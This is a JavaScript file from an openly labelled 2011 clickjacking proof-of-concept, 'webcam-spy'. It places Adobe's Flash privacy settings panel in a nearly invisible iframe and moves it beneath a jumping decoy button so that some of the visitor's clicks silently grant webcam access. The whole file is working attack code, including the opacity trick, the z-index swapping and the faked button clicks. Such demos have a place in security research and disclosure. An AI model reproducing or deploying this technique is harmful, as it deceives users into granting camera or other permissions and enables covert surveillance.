/**  Copyright 2011 Feross Aboukhadijeh
 *
 *   Licensed under the Apache License, Version 2.0 (the "License");
 *   you may not use this file except in compliance with the License.
 *   You may obtain a copy of the License at
 *
 *       http://www.apache.org/licenses/LICENSE-2.0
 *
 *   Unless required by applicable law or agreed to in writing, software
 *   distributed under the License is distributed on an "AS IS" BASIS,
 *   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *   See the License for the specific language governing permissions and
 *   limitations under the License.
 */

/**
 *                   Author:  Feross Aboukhadijeh
 *  Blog post & explanation:  http://feross.org/webcam-spy/
 *                Live demo:  http://feross.org/hacks/webcam-spy/
 *
 *  Not the prettiest code I've written, but it does the job.
 */

soundManager.url = 'swf/';
soundManager.flashVersion = 8;
var soundManagerLoaded = false;
soundManager.onload = function() {
    soundManagerLoaded = true;
};

var settingsCoords = [
    {x: -1100, y: -770},
    {x: -500, y: -670, refreshSettings: 400, refreshCam: 1},
    {x: -280, y: -840},
    {x: -100, y: -600, refreshSettings: 1, refreshCam: 400},
    {x: -1100, y: -770}];

var counter = 0;
var textChoices = ["Click me!", "Over here!", "Tap me!", "Press me!", "Touch me!"];
var settingsVisible = false;

$(function() {

    $('button.punch').click(function() {
        counter++;
        $('button.punch').text(textChoices[rand(textChoices.length)]);
        playSound();

        // Randomize the position of #container
        $('#container').css({left: rand(800), top: rand(500)});

        // Let the Flash settings manager get every nth click and let the blue
        // button get the rest. This is necessary since when Flash handles a
        // click, JavaScript doesn't get an event. So, we do it once in a while
        // and hope the user doesn't notice. Also, when we decide a click
        // belongs to Flash, we're not going to get an event for the click,
        // so we just click the button for the user after a short timeout.
        if (counter % 2 == 0) {
            if (!settingsCoords.length) {
                return;
            }

            var coord = settingsCoords.splice(0, 1)[0];

            $('button.punch').mouseover(function() {
                $('button.punch').css('z-index', 1); // let flash get clicks now

                window.setTimeout(function() {
                    $('button.punch')
                        .css('z-index', 100) // let the button get clicks now
                        .click();

                    // Should we refresh the flash compenents after this click?
                    if (coord.refreshSettings != undefined) {
                        refreshSettings(coord.refreshSettings);
                    }
                    if (coord.refreshCam != undefined) {
                        refreshCam(coord.refreshCam);
                    }
                }, 1000);
                $('button.punch').unbind('mouseover');
            });

            // Moves the settings panel to the next location
            $('#settings').css({left: coord.x, top: coord.y});
        }

    });

    $('#showHide').click(function(e) {
        settingsVisible = !settingsVisible;
        setSettingsVisibility();
        e.stopPropagation();
        e.preventDefault();
    });

    refreshSettings(1);
    refreshCam(1);
    $('#container').css({left: rand(500), top: rand(500)});
    var coord = settingsCoords[0];
    $('#settings').css({left: coord.x, top: coord.y});
});

// Random number between 1 and n
function rand(n) {
    return Math.floor(Math.random()*(n+1))
}

function setSettingsVisibility() {
    if (settingsVisible) {
        $('#settings iframe').css('opacity', 0.5);
    } else {
        $('#settings iframe').css('opacity', 0.001);
    }
}

function refreshSettings(timeout) {
    window.setTimeout(function() {
        $('#settings').empty().append($('<iframe allowtransparency="true" src="https://www.macromedia.com/support/flashplayer/sys/settingsmanager2.swf?defaultTab=privacy"></iframe>'));
        setSettingsVisibility();
    }, timeout);
}

function refreshCam(timeout) {
    window.setTimeout(function() {
        $('#cam').empty().append($('<embed wmode="transparent" width="320" height="240" align="middle" type="application/x-shockwave-flash" pluginspage="http://www.adobe.com/go/getflashplayer" name="ClickJacking" quality="high" id="ClickJacking" src="swf/ClickJacking.swf?131"/>'));
    }, timeout);
}

function playSound() {
    if (soundManagerLoaded) {
        soundManager
            .createSound({
                id: 'sound',
                url:'mp3/button-9.mp3'
            })
            .play({
                onfinish: function() {
                    this.destruct();
                }
            });
    }
}